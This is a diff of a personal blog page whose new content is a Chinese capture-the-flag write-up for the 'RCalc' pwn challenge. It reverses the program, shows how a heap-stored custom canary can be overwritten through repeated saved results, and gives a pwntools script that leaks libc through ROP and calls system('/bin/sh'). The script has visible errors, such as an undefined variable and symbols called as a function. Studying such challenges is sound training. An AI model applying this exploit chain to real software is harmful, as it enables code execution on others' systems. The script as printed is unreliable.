@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>RaceCondition.md | Rin</title>
+  <title>攻防世界 - RCalc | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -224,42 +224,88 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2022-04-07T17:11:22.484Z" itemprop="datePublished">
-          2022-04-08
+      <time datetime="2022-05-15T01:19:30.778Z" itemprop="datePublished">
+          2022-05-15
       </time>
     
     
     | 
-    <a href='/tags/pwncollege/'>pwncollege</a>
+    <a href='/tags/pwnable/'>pwnable</a>
     
     
 </span>
-                <h1>RaceCondition.md</h1>
+                <h1>攻防世界 - RCalc</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-lYdJdJKU" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+    <div id="aplayer-oINSpaaf" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
+
+<h1><span id="overview">overview</span></h1><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%889.20.54.png" alt="截屏2022-05-15 上午9.20.54"></p>
+<p>​        …栈溢出？</p>
+<h1><span id="reverse">reverse</span></h1><p>​        这个逻辑应该不是非常好逆。</p>
+<h2><span id="buf_init">buf_init</span></h2><p>​        首先是一个初始化随机数相关内存空间的一个函数。在bss段上malloc了两个0x10大小的chunk,其中位于高地址的 chunk1 + 8，也就是<code>0x6020F8 + 8</code>地方保存了另外一个0x100 size chunk的指针，而位于chunk0，也就是<code>0x6020F0</code> 的这个chunk ，<code>0x6020F0+8</code>  的位置（其实就是chunk1）的位置又保存了一个size为320的chunk的指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">random_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !random_chunk1 )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">random_chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !random_chunk0 )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">*random_chunk1 = <span class="number">0LL</span>;</span><br><span class="line">v0 = random_chunk1;</span><br><span class="line">*(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">*random_chunk0 = <span class="number">0LL</span>;</span><br><span class="line">v1 = random_chunk0;</span><br><span class="line">result = <span class="built_in">malloc</span>(<span class="number">0x320</span>uLL);</span><br><span class="line">*(v1 + <span class="number">8</span>) = result;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="run">run</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = Random_Number_Generator();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input your name pls: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\nWelcome to RCTF 2017!!!\n&quot;</span>, name);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s try our smart calculator&quot;</span>);</span><br><span class="line">caculate();</span><br><span class="line">result = sub_400B92();</span><br><span class="line"><span class="keyword">if</span> ( result != v2 )</span><br><span class="line">  <span class="keyword">default</span>();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​        整体逻辑的实现，比较简单，重点在计算的过程。这里的name输入理应没有溢出，估计是拿来leak的。</p>
+<p>​        然后首先还生成了随机数，跟进去看一看随机数的生成过程。</p>
+<h2><span id="random_number_generator">Random_Number_Generator()</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *random_chunk0 )                         <span class="comment">// if thread have not generated the random number,the value is 0,so the procedure will be skipped</span></span><br><span class="line">&#123;</span><br><span class="line">  ptr = *(*(random_chunk0 + <span class="number">8</span>) + <span class="number">8LL</span> * *random_chunk0 - <span class="number">8</span>);<span class="comment">// *(*chunk3 + 8 x *chunk0 - 8)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);        <span class="comment">// generate a random number and read it in ptr</span></span><br><span class="line">  fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">4uLL</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">&#125;</span><br><span class="line">srand(ptr);</span><br><span class="line">random = rand();</span><br><span class="line">v0 = random &lt;&lt; <span class="number">32</span>;                            <span class="comment">// random / 2^31, taking the right 32 bits</span></span><br><span class="line">random = v0 | rand();                         <span class="comment">// bit or operation, means for what? </span></span><br><span class="line">v1 = *(random_chunk0 + <span class="number">8</span>);                    <span class="comment">// reserve in chunk1 </span></span><br><span class="line">v2 = (*random_chunk0)++;                      <span class="comment">// Maybe likes a idx to control </span></span><br><span class="line">*(v1 + <span class="number">8</span> * v2) = random;                      <span class="comment">// I have no ideal on it</span></span><br><span class="line"><span class="keyword">return</span> random;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="save-result">save result</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v1 = *(random_chunk1 + <span class="number">8</span>);                    <span class="comment">// chunk1 &#x27;s value,point to chunk3(0x100)</span></span><br><span class="line">v2 = (*random_chunk1)++;</span><br><span class="line">result = a1;</span><br><span class="line">*(v1 + <span class="number">8</span> * v2) = a1;                          <span class="comment">// reserve result in chunk1 + (? + 8) x 8</span></span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h2><span id="0">0</span></h2><p>​        感觉pwncollege的堆题意思并不是很大，直接做条件竞争娱乐一下。</p>
-<h4><span id="level1">level1</span></h4><p>​        笑死了，根本没学过，不会做。</p>
+<p>​        这里其实我没有太理解这个保存的地方，在我看来这个<code>*(v1 + 8 * v2) = a1;   </code>中的v2是0x100chunk的指针，8乘以一个指针未免太可怕了。动调看一看。</p>
+<p>​        大概长这样：</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8810.59.27.png" alt="截屏2022-05-15 上午10.59.27">        </p>
+<p>整理出来就是</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8810.59.46.png" alt="截屏2022-05-15 上午10.59.46"></p>
+<p>这个0x320的chunk储存的就是生成的随机数。</p>
+<p>​        所以这里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2 = (*random_chunk0)++;                   </span><br><span class="line">  *(v1 + <span class="number">8</span> * v2) = random;</span><br></pre></td></tr></table></figure>
+
+<p>​        对应的v2就是这个自增的1,然后这里把随机数储存在<code>0x6033b0</code>。这样就比较清楚了。</p>
+<p>​        同理，这个对于结果的检测的逻辑也就很清晰:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> *(*(random_chunk0 + <span class="number">8</span>) + <span class="number">8LL</span> * (*random_chunk0)-- - <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​        也就是<code>0x603260 + （3*8-8） = 0x603288 =&gt; 0x6033b0 </code>的地方要是随机数，以防止我们修改什么的。</p>
+<p>​        </p>
+<p>​        </p>
+<h1><span id="利用">利用</span></h1><p>​    开始没有目的地随机尝试（美其名曰手工fuzz），发现一个说大不大说小不小的漏洞，就是由于题目似乎是没有限制计算次数，所以计算保存的结果是可以覆盖这个chunk的，但是题目是对于这个chunk保存的随机数作了检测的，类似一个canary，所以我们并不能随意覆盖。</p>
+<p>​                <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8811.29.09.png" alt="截屏2022-05-15 上午11.29.09"></p>
+<p>​        当然由于检测在这个函数返回之前进行，所以如果我们不返回的话还是可以肆无忌惮地溢出的，但是溢出的意义何在呢？随机数大概不能修改，而这里只有一个chunk size还有一些修改的意义，但是不能free，意义也不大。</p>
+<p>​        哦，这里name是可以溢出的，但是。。为什么这些题明明checksec检测没有canary但是实际还是有啊</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8811.50.43.png" alt="截屏2022-05-15 上午11.50.43"></p>
+<p>​        还是有canary。而且这里比较阴间，如果想要leak canary 就必须绕过空字节，但是截断输入必须要空字节。</p>
+<p>​        这个题现在是三个问题，一个是name的溢出由于canary不好控制，第二是结果保存的堆溢出由于随机数的检测无法返回，第三就是堆溢出不知道如何利用。我觉得思路应该是利用计算的漏洞，堆溢出也好，其他我没有看到的漏洞点也好，去leak一些东西，然而这样我们就没有办法重新利用name的栈溢出了。这个name的溢出只能在刚刚执行程序的时候利用，而且感觉由于这个空字节的存在，很难进行什么leak。。</p>
+<p>​        ps：稍微测试了一下，关于那个checksec的canary保护问题 ，canary其实是有三种模式，<code>-fno-stack-protector</code>就是完全关闭，<code>-fstack-protector</code>只保护局部变量中含有char数组的函数，<code>-fstack-protector-all</code>就是为所有代码添加canary。而经过测试，只有最后一种模式会使得checksec检测出canary。</p>
+<p>​        看了wp，大彻大悟了。刚刚说checksec没有检测出canary，不是因为部分保护，而是因为确实就是没有加入自带的caanry，而是程序手工实现了一个canary，而name溢出的canary就来自于我们生成的随机数，所以只要我们先随意rop，然后进入计算模块，将canary覆盖为我们自己定义的数值，这时候如果再返回，其实canary就已经被改变了，那么就相当于绕过了canary。确实比较巧妙，也其实很简单，只是我一直没有意识到这个栈上的canary其实就是堆上的canary，如果意识到了的话我应该是能独立完成的。绕过caanry的地方其实之前已经很清楚了，所以下面就略略地过一下了。</p>
+<p>栈name的canary</p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%881.26.27.png" alt="截屏2022-05-15 下午1.26.27"></p>
+<p>堆的canary</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%881.26.56.png" alt="截屏2022-05-15 下午1.26.56">                </p>
+<p>可以看到高位完全一致。所以在这里全部覆盖为0的话，下一次retn的时候栈上的canary就被绕过了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./RCalc&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;chall.pwnable.tw&quot;,10106)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./RCalc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x401123</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]  </span><br><span class="line">main_addr = <span class="number">0x401036</span></span><br><span class="line">__libc_start_main_ = <span class="number">0x601FF0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">begin</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Let&#x27;s try our smart calculator&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">&quot;input 2 integer: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;The result is&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Save the result? &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(__libc_start_main_)</span><br><span class="line">payload += p64(printf_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"><span class="comment">#payload += b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">begin(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">	add()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_start_main_addr - libc.symbols(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.symbols(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh;&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_addr_base &quot;</span>+<span class="built_in">hex</span>(libc_addr_base))</span><br><span class="line">log.success(<span class="string">&quot;bin_sh_addr &quot;</span>+<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">begin(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">	add()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="../%E5%B9%BB%E6%83%B3%E6%9B%B2-02-%E6%98%A5%E5%A4%9C/" style="float: left;">
-        ← 春夜
-    </a>
     
-    
-    <a class="pull-right" href="../../07/ciscn_2019_double/">
-        double →
+    <a class="pull-right" href="../../14/week11_6_pwnable_re-alloc/">
+        pwnable - re-alloc →
     </a>
     
 </nav>
